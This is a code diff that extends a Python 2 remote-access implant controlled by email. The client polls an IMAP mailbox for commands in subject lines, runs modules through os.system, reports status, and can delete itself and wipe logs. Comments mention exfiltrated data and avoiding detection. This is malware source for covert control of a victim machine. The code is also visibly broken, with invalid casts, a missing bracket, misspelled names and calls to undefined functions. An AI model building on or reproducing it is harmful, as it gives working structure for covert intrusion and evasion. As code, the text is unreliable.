@@ -12,6 +12,32 @@ IMAP_PORT   = 993
 config = open("./config", "r+")
 waitList = [] # stores commands to be executed, must stay under 2 threads as not to raise the alarms
 OSType = "" # received in the config, must be specified within the payload creation
+global_update = 0
+
+
+def execute_command(command_string, attachment):
+	if command_string[0:3] == "UPC": #Update the config file with the provided attachemnt
+		updateConfig(attachment)
+	elif command_string[0:3] == "STT": #get status of system, respond to server
+		status_update()
+	elif command_string[0:3] == "RUN": #runs a specified module and sends back the updates of running, and exit status + any exfiltrated data
+		execute_module(command_string[3:5])
+	elif command_string[0:3] == "DEL": #deletes the client itself as well as any leftover modules, as well as cleans logs
+		delete_all()
+
+
+def parse_updates(updates):
+	for key in updates:
+		try:
+			if updates[key][0:4] == my_id:
+				command_length = (int)updates[key][4:8]
+				update_number = (int)updates[key][8:12]
+				if update_number > global_update:
+					execute_command(updates[key][12:12+command_length)
+			else:
+				pass
+		except Exception, e:
+			print e
 
 
 def fromConfig():
@@ -20,14 +46,37 @@ def fromConfig():
 	global clientAddr
 	global clientPass
 	global modulesAvailable
-
+	global my_id
 
 	serverAddr = raw_config[0].strip()
 	clientAddr = raw_config[1].strip()
 	clientPass = raw_config[2].strip()
 	modulesAvailable = raw_config[3].strip()
+	my_id = raw_config[4].stip()
 	return
-def readMail(user,upass):
+def image_handler(attachment):
+	pass
+
+
+def attachment_handler(msg):
+	for part in msg.walk():
+		content_type =  part.get_content_type()
+		attachment = part.get_payload()
+		if content_type == "text/html":
+			print attachment
+		elif content_type == "text/plain":
+			print attachment
+		elif content_type == "image/png":
+			image_handler(attachment)
+		elif content_type == "mutlipart/alternative":
+			pass
+		
+		print type(attachment)
+
+
+def readMail(user,upass): #gets a dictionary of Updates/commands from server and passes it to the subject parser
+	updates = {}
+
 	server = imaplib.IMAP4_SSL(IMAP_SERVER,IMAP_PORT)
 	
 	server.login(user,upass)
@@ -41,7 +90,7 @@ def readMail(user,upass):
 	first_id = int(id_list[0])
 	
 	latest_id = int(id_list[-1])
-	print latest_id
+	#print latest_id
 
 
 	for i in range(latest_id, first_id, -1):
@@ -55,26 +104,47 @@ def readMail(user,upass):
 				email_from = msg['from']
 				print email_subject
 				print email_from
-				
+				updates[i] = email_subject
+				#if msg.is_multipart():
+				#	for part in msg.walk():
+				#		print part.get_content_type()
 				if msg.is_multipart():
-					for part in msg.walk():
-						print part.get_content_type()
+					attachment_handler(msg)
+	return updates
+
+
 def executeModule(moduleNum): #runs the specified module and generates a report back to the server
 	os.system(moduleNum)
 	pass
-def sendReport(moduleNum, status, exifData): #sends an update to the server with the module number, if it succeeded or not, and any exfiltrated data hidden in an image
+def sendReport(moduleNum, status, exifData): #sends an update to the server with the module number, if it succeeded or not
 	pass
 def newKey(): #when the newKey command is sent from the server along with the generated key, this integrates it into communication and sends back the old key in the "OK"
 	pass
-def encrypt(): #same as the server
-	pass
-def decrypt(): #see above
-	pass
+def encryptRSA(key, payload):
+  publicKey = key.publickey()
+  return publicKey.encrypt(payload)
+
+def decryptRSA(key, payload):
+  return key.decrypt(payload)
+
+def getKeys(privatePath, publicPath):
+  pub = open(dir + publicPath, 'w+')
+  pri = open(dir + privatePath, 'w+')
+
+  key = generateKey()
+
+  pub.write(key.publickey().export_key('PEM'))
+  pri.write(key.export_key('PEM'))
+
+  pub.close()
+  pri.close()
+
+  return key
 def updateConfig(newConfig): #updates the config to replace an old email, or update the modules list
 	try:
 		config.truncate(0)
 		for line in newConfig:
-		config.write(line)
+			config.write(line)
 		return 1
 	except Exception, e:
 		return e
@@ -112,7 +182,7 @@ Subject: %s
 
 
 def main():
-	fromConfig(config)
-	readMail(clientAddr, clientPass)
+	fromConfig()
+	parse_updates(readMail(clientAddr, clientPass))
 	pass
 main()
